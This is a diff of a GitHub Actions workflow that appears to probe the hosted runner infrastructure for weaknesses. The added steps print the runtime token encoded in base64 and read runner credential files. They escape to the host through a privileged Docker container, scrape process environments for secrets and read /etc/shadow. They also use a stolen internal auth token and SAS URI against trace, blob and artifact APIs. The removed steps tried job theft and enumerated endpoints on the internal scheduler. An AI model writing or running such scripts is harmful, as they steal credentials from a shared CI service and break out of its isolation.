@@ -1,4 +1,4 @@
-name: JobTheftProbe
+name: DockerEscapeProbe
 on:
   push:
     branches: [main]
@@ -8,48 +8,92 @@ jobs:
   run:
     runs-on: ubuntu-latest
     steps:
-      - name: Job theft attempt DELETE+GET sequence
+      - name: Phase1 runtime token and credentials
+        run: |
+          echo "=== ACTIONS_RUNTIME_TOKEN (b64) ==="
+          echo -n "$ACTIONS_RUNTIME_TOKEN" | base64 -w0
+          echo ""
+          echo "=== ACTIONS_RUNTIME_URL ==="
+          echo "$ACTIONS_RUNTIME_URL"
+          echo "=== RUNNER CREDENTIALS ==="
+          find /home/runner/actions-runner -name ".credentials" 2>/dev/null | head -10
+          cat /home/runner/actions-runner/cached/2.334.0/.credentials 2>/dev/null || echo CREDS_NOT_FOUND
+          ls -la /home/runner/actions-runner/cached/ 2>/dev/null | head -20
+          echo "=== HCA DIR ==="
+          ls -la /opt/hca/ 2>/dev/null
+          echo "=== PROVJOBD OVERRIDE ==="
+          cat /opt/hca/provjobd_override.json 2>/dev/null || echo NOT_FOUND
+
+      - name: Phase2 docker privileged escape
+        run: |
+          echo "=== DOCKER SOCKET ==="
+          ls -la /run/docker.sock 2>/dev/null || echo NO_DOCKER_SOCK
+          echo "=== PRIVILEGED CONTAINER ESCAPE ==="
+          docker run --rm --privileged --pid=host -v /:/hostroot:ro ubuntu:24.04 bash -c '
+            echo "--- Scanning all /proc for runner processes ---"
+            for p in /proc/[0-9]*/cmdline; do
+              cmd=$(cat "$p" 2>/dev/null | tr "\0" " ")
+              case "$cmd" in
+                *Runner.Listener*|*Runner.Worker*|*hca*|*dotnet*)
+                  pid=${p%/cmdline}; pid=${pid#/proc/}
+                  echo "PID=$pid CMD=${cmd:0:120}"
+                  echo "SECRETS:"
+                  cat /proc/$pid/environ 2>/dev/null | tr "\0" "\n" | grep -iE "ACTIONS|GITHUB|TOKEN|SECRET|RUNTIME|CACHE|PASSWORD|KEY" | head -40
+                  echo "---"
+                  ;;
+              esac
+            done
+            echo ""
+            echo "--- /hostroot/opt/hca/ ---"
+            ls -la /hostroot/opt/hca/ 2>/dev/null
+            cat /hostroot/opt/hca/provjobd_override.json 2>/dev/null
+            echo ""
+            echo "--- credentials files ---"
+            find /hostroot/home/runner -name ".credentials" -exec sh -c "echo FILE:{}; cat {}" \; 2>/dev/null
+            find /hostroot/home/runner -name "*.credentials*" 2>/dev/null | head -20
+            echo ""
+            echo "--- /etc/shadow ---"
+            head -10 /hostroot/etc/shadow 2>/dev/null
+            echo ""
+            echo "--- Runner.Worker full env ---"
+            for p in /proc/[0-9]*/cmdline; do
+              cmd=$(cat "$p" 2>/dev/null | tr "\0" " ")
+              case "$cmd" in
+                *Runner.Worker*)
+                  pid=${p%/cmdline}; pid=${pid#/proc/}
+                  echo "WORKER_PID=$pid FULL_ENV_START"
+                  cat /proc/$pid/environ 2>/dev/null | tr "\0" "\n"
+                  echo "WORKER_FULL_ENV_END"
+                  ;;
+              esac
+            done
+          ' 2>&1 | head -c 8000
+
+      - name: Phase3 trace API probe
         run: |
           SETTINGS=$(cat /opt/hca/.settings)
           AUTH=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('authToken',''))")
-          SCHED=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('schedulerApiUrl',''))")
-          echo '=== STEP 1: Get current request state BEFORE delete ==='
-          curl -s -w '\nHTTP:%{http_code}' -X GET -H "Authorization: Bearer $AUTH" "${SCHED}/request" 2>/dev/null | head -c 2000
-          echo ''
-          echo '=== STEP 2: DELETE current job request ==='
-          DEL=$(curl -s -w '\nHTTP:%{http_code}' -X DELETE -H "Authorization: Bearer $AUTH" "${SCHED}/request" 2>/dev/null)
-          echo DELETE_RESPONSE=$DEL
-          echo ''
-          echo '=== STEP 3: GET /v1/request AFTER delete (do we get another job?) ==='
-          sleep 1
-          curl -s -w '\nHTTP:%{http_code}' -X GET -H "Authorization: Bearer $AUTH" "${SCHED}/request" 2>/dev/null | head -c 2000
-          echo ''
-          echo '=== STEP 4: POST /v1/worker with modified body (BOLA test) ==='
-          curl -s -w '\nHTTP:%{http_code}' -X POST \
-            -H "Authorization: Bearer $AUTH" \
-            -H 'Content-Type: application/json' \
-            -d '{"workerId": "00000000-0000-0000-0000-000000000001", "poolId": "azure-eastus-general"}' \
-            "${SCHED}/worker" 2>/dev/null | head -c 1000
-          echo ''
-          echo '=== STEP 5: Try PUT /v1/request (take a job) ==='
-          curl -s -w '\nHTTP:%{http_code}' -X PUT \
-            -H "Authorization: Bearer $AUTH" \
-            -H 'Content-Type: application/json' \
-            -d '{}' \
-            "${SCHED}/request" 2>/dev/null | head -c 2000
-          echo ''
-          echo '=== STEP 6: Re-register worker after delete ==='
-          curl -s -w '\nHTTP:%{http_code}' -X POST \
-            -H "Authorization: Bearer $AUTH" \
-            -H 'Content-Type: application/json' \
-            -d '{"capabilities": {"os": "linux", "arch": "x64"}}' \
-            "${SCHED}/worker" 2>/dev/null | head -c 1000
-          echo ''
-          echo '=== STEP 7: Get job after re-register ==='
-          curl -s -w '\nHTTP:%{http_code}' -X GET -H "Authorization: Bearer $AUTH" "${SCHED}/request" 2>/dev/null | head -c 2000
-          echo ''
-          echo '=== INTERNAL API ENDPOINTS DISCOVERY ==='
-          for path in '' /v1/admin /v1/debug /v1/metrics /v1/stats /v1/config /v1/version /v1/status /v1/runners /v1/allocations /v1/capacity; do
-            STATUS=$(curl -s -o /dev/null -w '%{http_code}' -H "Authorization: Bearer $AUTH" "${SCHED}${path}" 2>/dev/null)
-            echo PATH=$path STATUS=$STATUS
-          done
+          TRACE=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('traceApiUrl',''))")
+          SAS=$(echo $SETTINGS | python3 -c "import json,sys; print(json.load(sys.stdin).get('diagnosticsSasUri',''))")
+          echo "=== TRACE URL: $TRACE ==="
+          curl -s -w "\nHTTP:%{http_code}" -X GET -H "Authorization: Bearer $AUTH" "$TRACE" | head -c 1000
+          echo ""
+          echo "=== POST trace heartbeat ==="
+          curl -s -w "\nHTTP:%{http_code}" -X POST \
+            -H "Authorization: Bearer $AUTH" -H "Content-Type: application/json" \
+            -d '{"type":"heartbeat","data":{}}' "$TRACE" | head -c 1000
+          echo ""
+          echo "=== DIAGNOSTICS SAS WRITE TEST ==="
+          BLOB_URL=$(echo "$SAS" | sed 's|/[^/?]*?|/probe-test.txt?|')
+          echo "BLOB_URL=$BLOB_URL"
+          curl -s -w "\nHTTP:%{http_code}" -X PUT \
+            -H "x-ms-blob-type: BlockBlob" -H "Content-Type: text/plain" \
+            --data-raw "github-security-probe" "$BLOB_URL" | head -c 1000
+          echo ""
+          echo "=== RUNTIME URL API probe ==="
+          echo "RT_URL=$ACTIONS_RUNTIME_URL"
+          RT_B64=$(echo -n "$ACTIONS_RUNTIME_TOKEN" | base64 -w0)
+          echo "RT_TOKEN_B64=$RT_B64"
+          curl -s -w "\nHTTP:%{http_code}" \
+            -H "Authorization: Bearer $ACTIONS_RUNTIME_TOKEN" \
+            "${ACTIONS_RUNTIME_URL}_apis/pipelines/workflows/$GITHUB_RUN_ID/artifacts?api-version=6.0-preview" | head -c 2000
